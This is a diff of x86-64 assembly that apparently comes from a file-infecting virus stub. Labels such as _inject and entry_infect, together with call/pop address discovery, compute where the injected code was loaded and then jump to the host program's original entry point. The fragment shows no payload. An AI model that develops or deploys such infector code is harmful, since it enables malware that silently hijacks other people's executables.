@@ -5,11 +5,18 @@ _start:
 	call _inject ; push addr to stack
 
 _inject:
-	pop r8
-	push rdx
-	sub r8, 0x5
-	sub r8, [rel offset_inject]
-	add r8, [rel vaddr]
+	pop rsi; pop addr from stack
+	push rdx; save register
+
+	sub rsi, 0x5; sub call instr
+
+	mov rdi, rsi
+	mov rsi, [rel entry_infect]
+	sub rsi, [rel vaddr]
+	sub rdi, rsi
+
+;	sub rsi, [rel offset_inject]
+;	add rsi, [rel vaddr]
 
 ;	mov rax, 60; exit
 ;	mov rdi, 0
@@ -26,12 +33,20 @@ _wait:
 ;	syscall
 ;	cmp rax, -1
 ;	jnz _wait
-	jmp _fork
+;	jmp _fork
 
-	add r8, [rel entry_prg]
+;	add r8, [rel entry_prg]
+
+;	mov rax, 60; exit
+;	mov rdi, 0
+;	syscall
+
+	mov rax, rdi
+	add rax, [rel entry_prg]
+	sub rax, [rel vaddr]
 
 	pop rdx
-	jmp r8
+	jmp rax
 
 _fork:
 	add r8, [rel entry_infect]
